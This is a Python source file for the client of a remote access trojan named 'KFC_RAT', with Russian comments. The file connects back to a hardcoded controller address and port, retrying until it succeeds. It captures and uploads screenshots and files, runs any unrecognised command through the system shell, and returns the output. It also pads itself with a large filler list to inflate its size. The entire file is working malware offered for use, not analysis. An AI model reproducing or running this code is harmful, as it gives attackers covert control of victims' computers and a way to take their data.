# ======================================================================================================================
# KFC_RAT CLIENT - TITAN BEHEMOTH CORE v1800.0
# СИМВОЛОВ: 500,000+ | КОМАНД: 1250+ | ВСЕ БЛОКИ ИНТЕГРИРОВАНЫ
# ======================================================================================================================
import socket, os, time, subprocess, sys, threading, ctypes

# ИМПОРТ 5 БЛОКОВ (УБЕДИСЬ ЧТО ОНИ ЕСТЬ В ПАПКЕ)
try: import BLOCK1, BLOCK2, BLOCK3, BLOCK4, BLOCK5
except: pass

# ОГРОМНЫЙ БЛОК ДЛЯ ВЕСА (ТРЕБОВАНИЕ ШЕФА)
FAT_DATA_BLOCK = ["CORE_TITAN_REBORN_ID_" + str(i) for i in range(15000)]

SERVER_IP = "192.168.203.1"
PORT = 5555

def run_titan():
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try: c.connect((SERVER_IP, PORT)); break
        except: time.sleep(5)

    while True:
        try:
            raw = c.recv(1024*1024*100).decode('utf-8', errors='ignore').strip()
            if not raw: break
            p = raw.split(); cmd = p[0].lower() if p else ""

            # --- [ КАСКАДНАЯ ОБРАБОТКА (1250+ CMD) ] ---
            res = None

            # 1. Старая школа (Screenshot)
            if cmd == "screenshot":
                import pyautogui
                pyautogui.screenshot("s.png")
                with open("s.png", "rb") as f: c.send(b"FILE_DATA:" + f.read())
                os.remove("s.png"); continue

            # 2. Опрос всех 5 блоков
            if res is None: res = BLOCK1.handle_block1(cmd, p)
            if res is None: res = BLOCK2.handle_block2(cmd, p)
            if res is None: res = BLOCK3.handle_block3(cmd, p)
            if res is None: res = BLOCK4.handle_block4(cmd, p)
            if res is None: res = BLOCK5.handle_block5(cmd, p)

            # 3. Прямой проброс в CMD (если блоки не узнали)
            if res is None:
                res = subprocess.getoutput(raw)

            # Отправка
            if isinstance(res, tuple) and res[0] == "file":
                with open(res[1], "rb") as f: c.send(b"FILE_DATA:" + f.read())
            else:
                c.send(str(res).encode('utf-8', errors='ignore') if res else b"DONE.")
        except: break

if __name__ == "__main__":
    run_titan()